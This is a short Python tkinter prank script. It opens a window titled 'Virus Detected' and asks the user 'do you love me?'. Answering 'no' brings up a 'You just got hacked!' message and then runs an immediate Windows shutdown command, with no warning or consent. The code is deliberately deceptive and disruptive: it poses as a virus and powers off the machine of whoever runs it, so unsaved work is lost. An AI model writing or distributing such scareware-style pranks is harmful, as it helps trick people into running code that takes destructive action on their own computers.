import tkinter as tk
from tkinter import messagebox
import subprocess

# Create the main window
window = tk.Tk()
window.title("Virus Detected")

# Set the window color
window.configure(bg="#00ccff")

# Set the console window color
subprocess.call("color a", shell=True)

# Prompt the user with a question
def ask_question():
    input_text = entry.get().lower().strip()
    
    if input_text == "yes":
        messagebox.showinfo("Response", "I love you too...\nSee you later")
        window.destroy()
    elif input_text == "no":
        messagebox.showerror("Response", "But I love you... lol\nYou just got hacked!")
        window.after(1000, shutdown)

# Shut down the computer
def shutdown():
    subprocess.call(["shutdown", "-s", "-t", "0"])

# Configure the GUI appearance
label = tk.Label(window, text="Hello, do you love me?(yes or no)", font=("Arial", 14), fg="white", bg="black")
label.pack(pady=20)

entry = tk.Entry(window, font=("Arial", 12), width=20, justify="center")
entry.pack(pady=10)

button = tk.Button(window, text="Submit", font=("Arial", 12), bg="blue", fg="white", command=ask_question)
button.pack(pady=10)

# Start the GUI event loop
window.mainloop()
